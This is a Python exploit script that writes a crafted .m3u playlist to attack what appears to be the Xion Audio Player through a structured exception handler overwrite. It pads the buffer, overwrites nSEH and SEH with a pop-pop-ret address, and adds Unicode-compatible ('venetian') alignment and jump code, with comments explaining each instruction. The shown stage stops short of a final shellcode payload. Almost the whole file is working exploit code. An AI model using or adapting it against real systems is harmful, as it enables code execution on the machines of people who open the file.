import struct

total = 5000
fuzz = "A" * 206
#fuzz += "\x41\x41"
#replaced with NOP like instruction
fuzz += "\x61\x62" #overwrite nSEH, \x61 (popad - pop all general purposes registers), \x62 (nop/align)
# pop pop ret = 0x00450015
fuzz += "\x15\x45" #overwrite SEH
#the ebp remains the same pointing to 0012f2ac
# which is pointing to nseh
# put to eax then add 100 so it will point to +100 after ebp

#push ebp
#pop eax
#add eax,0x11001400
#sub eax,0x11001300

#push eax
#ret

#venetian shellcode of push ebp+100 to eax
fuzz += "D" #first D found in the 1500 45004400 (because it is used as part of the offset in the instruction that is executed at SE Handler"
fuzz += "\x6e" #nop align 006e00
fuzz += "\x55" #push ebp 55
fuzz += "\x6e" #nop align 006e00
fuzz += "\x58" #pop eax 58
fuzz += "\x6e" #nop align
fuzz += "\x05\x14\x11" # add eax, 0x11001400 0500 14001100
fuzz += "\x6e" #nop align 006e00
fuzz += "\x2d\x13\x11" #sub eax;0x11001300 2d00 13001100
fuzz += "\x6e"

#then the venetian jumpcode
fuzz += "\x50"
fuzz += "\x6d"
fuzz += "\xc3"

fuzz += "D" * (total-206-2-2-17) 

filename = "C:\Documents and Settings\yunaranyancat\Desktop\XionAudioPlayer\jmpeax.m3u"

with open(filename, 'w') as outfile:
    outfile.write(fuzz)

